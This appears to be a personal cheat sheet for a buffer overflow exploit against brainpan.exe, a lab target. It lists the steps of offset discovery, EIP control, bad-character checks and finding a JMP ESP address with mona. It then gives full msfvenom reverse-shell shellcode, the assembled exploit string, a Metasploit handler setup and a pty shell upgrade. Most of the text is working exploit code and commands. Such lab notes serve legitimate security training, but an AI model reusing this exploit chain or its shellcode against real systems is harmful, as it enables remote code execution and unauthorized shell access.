1. Identify exact amount of bytes to crash
2. Control EIP/ESP
3. find bad-chars
4. find the JMP ESP
5. Write shellcode
6. Exploit


1-2.
    # 1000 bytes will crash application
        > msf-pattern_create -l 1000
        > record get value of EIP register
     # get offset 
        > msf-pattern_offset -l 1000 -q 35724134
        > [*] Exact match at offset 524
     # Ensure EIP taken over
        > (A*524)+(B*4)+(C*(1000-524-4))
        > EIP = \x42\x42\x42\x42

3.
    badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
    "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

    NPP: RE to check bad chars from hexdump

        ^.{8}   (.{8}).*
        \1

        (.{2})(.{2})(.{2})(.{2})
        \4\3\2\1

        (.0)$
        \n\1
     
     Only bad chars are \x00
  
4.
    # Find modules without mem protection
        !mona modules
            > brainpan.exe
    # Find JMP ESP in module without mem protection
        !mona find -s ‘\xff\xe4’ -m brainpan.exe
            > 311712F3   . FFE4           JMP ESP
    # convert to BE
            > f3 12 17 31
            > \xf3\x12\x17\x31
     # Ensure EIP jumps to JMP ESP
            > (A*524)+(\xf3\x12\x17\x31)+(C*(1000-524-4))
            > EIP = \xf3\x12\x17\x31
            > breakpoint  JMP ESP
   
5.

    msfvenom -v shellcode -b '\x00' -p linux/x86/shell/reverse_tcp -f python LHOST=127.0.0.1 LPORT=4444
    
    [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
    [-] No arch selected, selecting arch: x86 from the payload
    Found 11 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 150 (iteration=0)
    x86/shikata_ga_nai chosen with final size 150
    Payload size: 150 bytes
    Final size of python file: 824 bytes
    shellcode =  ""
    shellcode += "\xd9\xcd\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x1f\xba"
    shellcode += "\x2f\x10\xee\x09\x31\x50\x1a\x83\xc0\x04\x03\x50"
    shellcode += "\x16\xe2\xda\x7a\xe4\x57\x15\xa0\x0f\x84\x06\x15"
    shellcode += "\xa3\x21\xaa\x29\x25\x3f\x4b\x84\x2a\xa8\xd0\x7f"
    shellcode += "\x54\xd7\xe6\x7e\xc2\xd5\xe6\x91\x4e\x53\x07\xfb"
    shellcode += "\x08\x3b\x97\xad\x83\x32\xf6\x0d\xe1\xc5\x7d\x51"
    shellcode += "\x80\xdc\x33\x26\x4e\xb7\x69\xc6\xb0\x47\x35\xad"
    shellcode += "\xb0\x2d\xc0\xb8\x52\x80\x03\x77\x14\x66\x53\xf1"
    shellcode += "\xa8\x82\x74\xb0\xd4\xed\x7a\xa4\xda\x0d\xf3\x27"
    shellcode += "\x1b\xe6\x0f\x69\x7f\xf5\xbf\x14\x4d\x86\x3a\x26"
    shellcode += "\x35\x97\x1f\x2e\x27\x0e\x29\x3c\x18\x32\x98\xbd"
    shellcode += "\xdd\xf5\x5a\xbc\x22\x14\x22\xc1\xdc\xd7\x52\x79"
    shellcode += "\xdd\xd7\x52\x7d\x13\x57"
    
    buf = ("A"*524)
    eip = "\xf3\x12\x17\x31"
    nop = "\x90"*20
    string = buf+eip+nop+shellcode+("C"*(1000-524-4-20-len(shellcode)))


6.

    use exploit/multi/handler
    set PAYLOAD linux/x86/shell/reverse_tcp
    Set RHOST 127.0.0.1
    set LHOST 127.0.0.1
    set LPORT 4444
    run

    python -c 'import pty; pty.spawn("/bin/bash")'